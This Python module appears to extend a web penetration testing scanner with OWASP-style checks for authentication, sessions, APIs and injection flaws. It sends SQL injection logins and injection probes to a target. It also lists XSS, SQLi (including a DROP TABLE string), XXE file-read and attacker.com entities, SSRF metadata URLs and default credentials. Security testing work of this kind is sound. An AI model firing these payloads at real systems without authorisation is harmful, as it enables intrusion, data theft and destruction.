#!/usr/bin/env python3
"""
Advanced Security Testing Modules
Extended functionality for the Web Penetration Testing Tool

This module provides additional testing capabilities including:
- Advanced Authentication Testing
- Session Management Security Testing  
- API Security Testing
- Business Logic Testing
- Advanced Payload Testing
"""

import requests
import json
import time
import hashlib
import base64
import re
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Any, Optional
import xml.etree.ElementTree as ET


class AdvancedSecurityTester:
    """Extended security testing capabilities"""

    def __init__(self, session: requests.Session, target: str):
        self.session = session
        self.target = target
        self.vulnerabilities = []

    def authentication_testing(self) -> Dict[str, Any]:
        """
        OWASP Testing Guide: Authentication Testing
        Comprehensive authentication security assessment
        """
        results = {
            'login_forms': [],
            'auth_mechanisms': [],
            'vulnerabilities_found': [],
            'brute_force_protection': False,
            'password_policy': {},
            'multi_factor_auth': False
        }

        # Find login forms
        login_forms = self.discover_login_forms()
        results['login_forms'] = login_forms

        # Test authentication mechanisms
        for form in login_forms:
            auth_tests = self.test_authentication_mechanism(form)
            results['auth_mechanisms'].append(auth_tests)

        # Test for common authentication vulnerabilities
        self.test_authentication_bypass()
        self.test_weak_credentials()
        self.test_session_fixation()

        return results

    def discover_login_forms(self) -> List[Dict[str, Any]]:
        """Discover login forms on the target application"""
        login_forms = []
        common_login_paths = [
            '/login', '/signin', '/auth', '/admin/login',
            '/user/login', '/account/login', '/wp-login.php',
            '/administrator', '/admin.php'
        ]

        for path in common_login_paths:
            try:
                url = urljoin(f"http://{self.target}", path)
                response = self.session.get(url, timeout=10)

                # Look for login forms
                forms = re.findall(
                    r'<form[^>]*>(.*?)</form>', 
                    response.text, 
                    re.DOTALL | re.IGNORECASE
                )

                for form_content in forms:
                    if any(field in form_content.lower() for field in ['password', 'login', 'signin']):
                        login_forms.append({
                            'url': url,
                            'method': 'POST',
                            'fields': self.extract_form_fields(form_content),
                            'csrf_token': self.has_csrf_token(form_content)
                        })

            except Exception as e:
                continue

        return login_forms

    def extract_form_fields(self, form_content: str) -> List[str]:
        """Extract input field names from form HTML"""
        fields = re.findall(r'name=["']([^"']+)["']', form_content)
        return list(set(fields))

    def has_csrf_token(self, form_content: str) -> bool:
        """Check if form has CSRF protection"""
        csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token']
        return any(indicator in form_content.lower() for indicator in csrf_indicators)

    def test_authentication_mechanism(self, form_info: Dict[str, Any]) -> Dict[str, Any]:
        """Test authentication mechanism security"""
        results = {
            'url': form_info['url'],
            'sql_injection_vulnerable': False,
            'timing_attack_vulnerable': False,
            'lockout_mechanism': False,
            'secure_transmission': False
        }

        # Test for SQL injection in login
        sql_payloads = ["admin'--", "' OR '1'='1' --", "' OR 1=1#"]
        for payload in sql_payloads:
            login_data = {'username': payload, 'password': 'test'}
            try:
                response = self.session.post(form_info['url'], data=login_data, timeout=10)
                if 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                    results['sql_injection_vulnerable'] = True
                    self.add_vulnerability(
                        "SQL Injection in Authentication",
                        "high",
                        "A03:2021 – Injection",
                        "Authentication mechanism vulnerable to SQL injection",
                        form_info['url']
                    )
                    break
            except:
                pass

        # Test timing attacks
        start_time = time.time()
        self.session.post(form_info['url'], data={'username': 'admin', 'password': 'wrong'})
        normal_time = time.time() - start_time

        start_time = time.time()
        self.session.post(form_info['url'], data={'username': 'nonexistent_user_12345', 'password': 'wrong'})
        different_time = time.time() - start_time

        if abs(normal_time - different_time) > 0.5:
            results['timing_attack_vulnerable'] = True
            self.add_vulnerability(
                "Username Enumeration via Timing Attack",
                "medium",
                "A01:2021 – Broken Access Control",
                "Authentication timing reveals valid usernames",
                form_info['url']
            )

        # Check if using HTTPS
        results['secure_transmission'] = form_info['url'].startswith('https://')
        if not results['secure_transmission']:
            self.add_vulnerability(
                "Insecure Authentication Transmission",
                "high",
                "A02:2021 – Cryptographic Failures",
                "Authentication credentials transmitted over HTTP",
                form_info['url']
            )

        return results

    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        bypass_techniques = [
            {'username': ['admin', 'guest'], 'password': 'test'},
            {'username[]': 'admin', 'password[]': 'test'},
            {'username': '{"$ne": null}', 'password': '{"$ne": null}'}
        ]
        # Implementation would test these techniques
        pass

    def test_weak_credentials(self):
        """Test for default/weak credentials"""
        common_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('test', 'test')
        ]
        # Implementation for credential testing
        pass

    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        initial_response = self.session.get(f"http://{self.target}")
        initial_cookies = self.session.cookies.copy()
        # Implementation would test session fixation
        pass

    def session_management_testing(self) -> Dict[str, Any]:
        """
        OWASP Testing Guide: Session Management Testing
        Comprehensive session security assessment
        """
        results = {
            'session_cookies': [],
            'session_security': {},
            'vulnerabilities_found': []
        }

        cookies_analysis = self.analyze_session_cookies()
        results['session_cookies'] = cookies_analysis

        self.test_session_predictability()
        self.test_session_timeout()
        self.test_concurrent_sessions()
        self.test_session_logout()

        return results

    def analyze_session_cookies(self) -> List[Dict[str, Any]]:
        """Analyze session cookie security properties"""
        cookie_analysis = []

        response = self.session.get(f"http://{self.target}")

        for cookie in self.session.cookies:
            analysis = {
                'name': cookie.name,
                'value_length': len(cookie.value),
                'secure_flag': cookie.secure,
                'httponly_flag': getattr(cookie, 'httponly', False),
                'samesite': getattr(cookie, 'samesite', None),
                'domain': cookie.domain,
                'path': cookie.path,
                'expires': getattr(cookie, 'expires', None)
            }

            if not analysis['secure_flag']:
                self.add_vulnerability(
                    "Missing Secure Flag on Session Cookie",
                    "medium",
                    "A05:2021 – Security Misconfiguration",
                    f"Session cookie '{cookie.name}' missing Secure flag",
                    "Session Cookies"
                )

            if not analysis['httponly_flag']:
                self.add_vulnerability(
                    "Missing HttpOnly Flag on Session Cookie",
                    "medium",
                    "A05:2021 – Security Misconfiguration",
                    f"Session cookie '{cookie.name}' missing HttpOnly flag",
                    "Session Cookies"
                )

            cookie_analysis.append(analysis)

        return cookie_analysis

    def test_session_predictability(self):
        """Test if session IDs are predictable"""
        session_ids = []

        for _ in range(5):
            new_session = requests.Session()
            response = new_session.get(f"http://{self.target}")

            for cookie in new_session.cookies:
                if 'session' in cookie.name.lower() or 'jsessionid' in cookie.name.lower():
                    session_ids.append(cookie.value)

        if len(set(session_ids)) != len(session_ids):
            self.add_vulnerability(
                "Duplicate Session IDs Generated",
                "high",
                "A02:2021 – Cryptographic Failures",
                "Session ID generation produces duplicate values",
                "Session Management"
            )

    def test_session_timeout(self):
        """Test session timeout implementation"""
        pass

    def test_concurrent_sessions(self):
        """Test concurrent session handling"""
        pass

    def test_session_logout(self):
        """Test session invalidation on logout"""
        pass

    def api_security_testing(self) -> Dict[str, Any]:
        """
        OWASP API Security Top 10 Testing
        Comprehensive API security assessment
        """
        results = {
            'endpoints_discovered': [],
            'authentication_methods': [],
            'vulnerabilities_found': [],
            'rate_limiting': False,
            'input_validation': {}
        }

        api_endpoints = self.discover_api_endpoints()
        results['endpoints_discovered'] = api_endpoints

        for endpoint in api_endpoints:
            self.test_api_endpoint_security(endpoint)

        self.test_api_authentication()
        self.test_excessive_data_exposure()
        self.test_rate_limiting()
        self.test_mass_assignment()

        return results

    def discover_api_endpoints(self) -> List[Dict[str, Any]]:
        """Discover API endpoints"""
        endpoints = []
        common_api_paths = [
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/swagger', '/openapi.json', '/api-docs'
        ]

        for path in common_api_paths:
            try:
                url = urljoin(f"http://{self.target}", path)
                response = self.session.get(url, timeout=10)

                if response.status_code == 200:
                    content_type = response.headers.get('content-type', '')

                    if 'json' in content_type:
                        endpoints.append({
                            'url': url,
                            'method': 'GET',
                            'content_type': content_type,
                            'response_size': len(response.content)
                        })

                        if 'swagger' in path or 'openapi' in path:
                            self.parse_api_specification(response.text, endpoints)

            except Exception as e:
                continue

        return endpoints

    def parse_api_specification(self, spec_content: str, endpoints: List[Dict[str, Any]]):
        """Parse OpenAPI/Swagger specification for endpoints"""
        try:
            spec = json.loads(spec_content)

            if 'paths' in spec:
                base_url = f"http://{self.target}"

                for path, methods in spec['paths'].items():
                    for method, details in methods.items():
                        if method.upper() in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                            endpoints.append({
                                'url': urljoin(base_url, path),
                                'method': method.upper(),
                                'content_type': 'application/json',
                                'parameters': details.get('parameters', []),
                                'security': details.get('security', [])
                            })
        except:
            pass

    def test_api_endpoint_security(self, endpoint: Dict[str, Any]):
        """Test individual API endpoint security"""
        url = endpoint['url']
        method = endpoint['method']

        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${7*7}",
        ]

        for payload in injection_payloads:
            try:
                if method == 'GET':
                    test_url = f"{url}?param={payload}"
                    response = self.session.get(test_url, timeout=5)
                elif method == 'POST':
                    response = self.session.post(url, json={'param': payload}, timeout=5)
                else:
                    continue

                if payload in response.text or '49' in response.text:
                    self.add_vulnerability(
                        f"Injection Vulnerability in API Endpoint",
                        "high",
                        "A03:2021 – Injection", 
                        f"API endpoint vulnerable to injection: {payload}",
                        url
                    )

            except Exception as e:
                continue

    def test_api_authentication(self):
        """Test API authentication mechanisms"""
        pass

    def test_excessive_data_exposure(self):
        """Test for excessive data exposure in API responses"""
        pass

    def test_rate_limiting(self):
        """Test API rate limiting implementation"""
        test_endpoint = f"http://{self.target}/api"

        responses = []
        for i in range(10):
            try:
                response = self.session.get(test_endpoint, timeout=2)
                responses.append(response.status_code)
            except:
                break

        if all(code != 429 for code in responses):
            self.add_vulnerability(
                "Missing Rate Limiting",
                "medium",
                "A04:2021 – Insecure Design",
                "API endpoints lack rate limiting protection",
                "API Security"
            )

    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        pass

    def business_logic_testing(self) -> Dict[str, Any]:
        """
        OWASP Testing Guide: Business Logic Testing
        Test application business logic flaws
        """
        results = {
            'workflow_tests': [],
            'data_validation_tests': [],
            'authorization_tests': [],
            'vulnerabilities_found': []
        }

        self.test_workflow_bypass()
        self.test_race_conditions()
        self.test_price_manipulation()

        return results

    def test_workflow_bypass(self):
        """Test for workflow bypass vulnerabilities"""
        pass

    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        pass

    def test_price_manipulation(self):
        """Test for price/amount manipulation"""
        pass

    def advanced_payload_testing(self) -> Dict[str, Any]:
        """
        Advanced payload testing for various vulnerability types
        """
        results = {
            'payload_categories': [],
            'successful_payloads': [],
            'filtered_payloads': []
        }

        self.test_xss_payloads()
        self.test_sqli_payloads()
        self.test_xxe_payloads()
        self.test_ssrf_payloads()

        return results

    def test_xss_payloads(self):
        """Test advanced XSS payloads"""
        advanced_xss = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ]
        pass

    def test_sqli_payloads(self):
        """Test advanced SQL injection payloads"""
        advanced_sqli = [
            "' UNION SELECT NULL,version(),NULL--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "') OR '1'='1'--",
            "admin'/**/OR/**/1=1--",
        ]
        pass

    def test_xxe_payloads(self):
        """Test XML External Entity (XXE) payloads"""
        xxe_payload1 = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""

        xxe_payload2 = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://attacker.com/malicious">
]>
<foo>&xxe;</foo>"""
        pass

    def test_ssrf_payloads(self):
        """Test Server-Side Request Forgery (SSRF) payloads"""
        ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
        ]
        pass

    def add_vulnerability(self, title: str, severity: str, category: str, 
                         description: str, location: str):
        """Add vulnerability to results"""
        vulnerability = {
            'title': title,
            'severity': severity,
            'category': category,
            'description': description,
            'location': location,
            'timestamp': time.time()
        }
        self.vulnerabilities.append(vulnerability)


class EnhancedWebScanner:
    """Enhanced scanner combining all testing modules"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; AdvSecScan/2.0; +http://security-scanner.local)'
        })

    def comprehensive_security_assessment(self, target: str) -> Dict[str, Any]:
        """Run complete security assessment"""

        advanced_tester = AdvancedSecurityTester(self.session, target)

        results = {
            'target': target,
            'timestamp': time.time(),
            'authentication_testing': advanced_tester.authentication_testing(),
            'session_management': advanced_tester.session_management_testing(),
            'api_security': advanced_tester.api_security_testing(),
            'business_logic': advanced_tester.business_logic_testing(),
            'advanced_payloads': advanced_tester.advanced_payload_testing(),
            'all_vulnerabilities': advanced_tester.vulnerabilities
        }

        return results


def integrate_advanced_modules():
    """Integration function for main application"""
    return EnhancedWebScanner()
